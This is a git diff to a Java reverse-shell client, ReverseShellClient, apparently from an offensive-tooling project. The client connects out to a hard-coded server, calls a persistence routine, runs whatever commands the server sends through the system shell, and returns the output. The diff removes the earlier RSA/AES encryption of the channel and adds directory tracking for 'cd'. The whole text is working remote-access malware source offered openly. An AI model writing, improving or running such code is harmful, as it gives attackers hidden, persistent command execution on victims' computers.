@@ -2,9 +2,6 @@ package obs1d1anc1ph3r.reverseshell;
 
 import java.io.*;
 import java.net.*;
-import java.security.PublicKey;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
 
 public class ReverseShellClient {
 
@@ -14,24 +11,14 @@ public class ReverseShellClient {
     private Socket socket;
     private BufferedReader in;
     private PrintWriter out;
-    private PublicKey serverPublicKey;
+    private String currentDir = System.getProperty("user.dir");
 
-    public static void main(String[] args) throws Exception {
-        // Ensure AES Key and IV are initialized
-        if (Constants.AES_SECRET_KEY == null || Constants.IV == null) {
-            System.err.println("Failed to initialize AES key or IV.");
-            return;
-        }
-
-        // Log the initialized AES key and IV
-        System.out.println("AES Key (Base64): " + CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY));
-        System.out.println("IV (Base64): " + CryptoUtils.ivToBase64(Constants.IV));
-
+    public static void main(String[] args) {
         ReverseShellClient client = new ReverseShellClient();
         client.start();
     }
 
-    public void start() throws Exception {
+    public void start() {
         try {
             connectToServer();
             setupPersistence();
@@ -43,42 +30,49 @@ public class ReverseShellClient {
         }
     }
 
-    private void connectToServer() throws IOException, Exception {
+    private void connectToServer() throws IOException {
         System.out.println("[*] Connecting to server...");
         socket = new Socket(SERVER_IP, SERVER_PORT);
         System.out.println("[+] Connected to server: " + SERVER_IP + ":" + SERVER_PORT);
 
         in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         out = new PrintWriter(socket.getOutputStream(), true);
-
-        String serverPublicKeyBase64 = in.readLine();
-        serverPublicKey = CryptoUtils.getPublicKeyFromBase64(serverPublicKeyBase64);
-        sendAESKey();
-    }
-
-    private void sendAESKey() throws Exception {
-        String aesKeyBase64 = CryptoUtils.secretKeyToBase64(Constants.AES_SECRET_KEY);
-        String encryptedAESKey = CryptoUtils.encryptRSA(aesKeyBase64, serverPublicKey);
-        out.println(encryptedAESKey);
-        out.println(CryptoUtils.ivToBase64(Constants.IV)); // Send IV to server
-        System.out.println("[*] AES key and IV sent to server.");
     }
 
     private void handleCommands() throws IOException {
-        String encryptedCommand;
-        while ((encryptedCommand = in.readLine()) != null) {
-            String command = decryptCommand(encryptedCommand);
-
+        String command;
+        while ((command = in.readLine()) != null) {
             if (command.equalsIgnoreCase("exit")) {
                 System.out.println("[-] Server disconnected.");
                 break;
             }
 
-            // Log the decrypted command
-            System.out.println("Decrypted Command: " + command);
+            if (command.startsWith("cd ")) {
+                String newDir = command.substring(3).trim();
+                newDir = newDir.replaceAll("/+$", "");
+                newDir = newDir.trim();
 
-            String result = executeCommand(command);
-            sendResponse(result);
+                if (newDir.equals("..")) {
+                    File parentDir = new File(currentDir).getParentFile();
+                    if (parentDir != null) {
+                        currentDir = parentDir.getAbsolutePath();
+                        sendResponse("Changed directory to: " + currentDir);
+                    } else {
+                        sendResponse("Error: Already at the root directory");
+                    }
+                } else {
+                    File dir = new File(currentDir, newDir);
+                    if (dir.isDirectory()) {
+                        currentDir = dir.getAbsolutePath();
+                        sendResponse("Changed directory to: " + currentDir);
+                    } else {
+                        sendResponse("Error: Not a valid directory");
+                    }
+                }
+            } else {
+                String result = executeCommand(command);
+                sendResponse(result);
+            }
         }
     }
 
@@ -88,6 +82,7 @@ public class ReverseShellClient {
         try {
             ProcessBuilder processBuilder = new ProcessBuilder();
             processBuilder.command(getShell(), getShellFlag(), command);
+            processBuilder.directory(new File(currentDir));
             processBuilder.redirectErrorStream(true);
 
             Process process = processBuilder.start();
@@ -95,7 +90,7 @@ public class ReverseShellClient {
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                 String line;
                 while ((line = reader.readLine()) != null) {
-                    output.append(line).append("\n");
+                    output.append(line).append(" ");
                 }
             }
         } catch (IOException e) {
@@ -117,26 +112,9 @@ public class ReverseShellClient {
         return System.getProperty("os.name").toLowerCase().contains("win");
     }
 
-    private String decryptCommand(String encryptedCommand) {
-        try {
-            String decryptedCommand = CryptoUtils.decryptAES(encryptedCommand, Constants.AES_SECRET_KEY, Constants.IV);
-            System.out.println("Decrypted Command: " + decryptedCommand);
-            return decryptedCommand;
-        } catch (Exception e) {
-            System.err.println("Error decrypting command: " + e.getMessage());
-            return "";
-        }
-    }
-
     private void sendResponse(String response) {
-        try {
-            String encryptedResponse = CryptoUtils.encryptAES(response, Constants.AES_SECRET_KEY, Constants.IV);
-            System.out.println("Raw Response before Encryption: " + response);
-            System.out.println("Encrypted Response (Base64): " + encryptedResponse);
-            out.println(encryptedResponse);
-        } catch (Exception e) {
-            System.err.println("Error encrypting response: " + e.getMessage());
-        }
+        out.println(response.trim());
+        out.flush();
     }
 
     public void setupPersistence() {
